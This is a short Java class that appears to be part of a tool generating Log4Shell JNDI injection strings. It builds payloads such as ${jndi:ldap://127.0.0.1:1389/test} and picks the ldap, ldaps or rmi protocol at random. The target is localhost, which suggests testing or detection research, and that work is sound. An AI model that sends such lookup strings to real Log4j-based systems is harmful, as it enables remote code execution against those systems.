package org.yuudai;

import org.jetbrains.annotations.NotNull;

public class PlainPatternsGenerator {
    final String jndi = "jndi:";
    /**
     * 攻撃パターンで使用するプロトコル
     */
    final String[] proto = {"ldap", "ldaps", "rmi"};
    /**
     * 対象のIPアドレス
     */
    final String address = "127.0.0.1:1389/test";
    final String first = "${";

    protected @NotNull String GenerateTargetString() {
        return first + jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address + "}";
    }
}
